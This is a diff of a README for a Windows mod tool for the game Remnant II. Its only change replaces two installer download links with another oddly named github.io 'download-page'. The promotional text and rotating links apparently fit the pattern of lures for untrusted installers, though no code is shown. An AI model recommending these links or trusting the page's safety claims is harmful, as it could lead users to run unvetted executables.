@@ -2,7 +2,7 @@
 
 Remnant II Ultimate Toolbox is a powerful Windows desktop tool designed to enhance your Remnant II experience. This mod tool offers a range of features to customize and improve gameplay, making it perfect for both casual and hardcore players. Built specifically for Windows 10 and 11, it provides a user-friendly interface to access advanced modifications safely.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -94,7 +94,7 @@ For persistent issues, visit the support section on the GitHub repository.
 
 For the latest version of the Remnant II Ultimate Toolbox, use the download button at the top or follow this link:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 The current version is 15.07, released in 2026, with regular updates planned for new features and compatibility.
 
